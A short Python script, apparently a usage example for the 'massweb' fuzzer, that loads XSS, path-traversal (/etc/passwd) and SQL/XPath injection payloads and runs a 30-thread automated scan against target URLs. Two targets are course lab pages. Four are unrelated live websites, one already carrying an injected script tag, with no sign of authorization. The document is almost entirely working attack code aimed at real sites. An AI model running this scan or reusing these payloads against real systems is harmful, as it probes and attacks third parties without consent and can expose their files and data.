
from massweb.fuzzers.web_fuzzer import WebFuzzer
from massweb.payloads.payload import Payload

xss_payload = Payload('"><ScRipT>alert(31337)</ScrIpT>', check_type_list=["xss"])
trav_payload = Payload('../../../../../../../../../../../../../../../../../../etc/passwd', check_type_list=["trav"])
sqli_xpathi_payload = Payload("')--", check_type_list=["sqli", "xpathi"])

wf = WebFuzzer(num_threads=30, time_per_url=5)
wf.add_payload(xss_payload)
wf.add_payload(trav_payload)
wf.add_payload(sqli_xpathi_payload)
wf.add_target_from_url(u"http://course.hyperiongray.com/vuln1")
wf.add_target_from_url(u"http://course.hyperiongray.com/vuln2/898538a7335fd8e6bac310f079ba3fd1/")
wf.add_target_from_url(u"http://www.wpsurfing.co.za/?feed=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E")
wf.add_target_from_url(u"http://www.sfgcd.com/ProductsBuy.asp?ProNo=1%3E&amp;amp;ProName=1")
wf.add_target_from_url(u"http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;amp;typeofsite=snippetdetail&amp;amp;ID=1368&amp;amp;Sectionid=1")
wf.add_target_from_url(u"http://www.dobrevsource.org/index.php?id=1")

'''print "Targets list pre post determination:"
for target in wf.targets:
    print target

print "Targets list after additional injection points have been found:"'''
wf.determine_posts_from_targets()
'''for target in wf.targets:
    print target.url, target.data

print "FuzzyTargets list:"'''
wf.generate_fuzzy_targets()
'''for fuzzy_target in wf.fuzzy_targets:
    print fuzzy_target, fuzzy_target.ttype, fuzzy_target.data

print "Results of our fuzzing:"
for result in wf.fuzz():
    print result, result.fuzzy_target.ttype, result.fuzzy_target.payload'''
wf.fuzz()
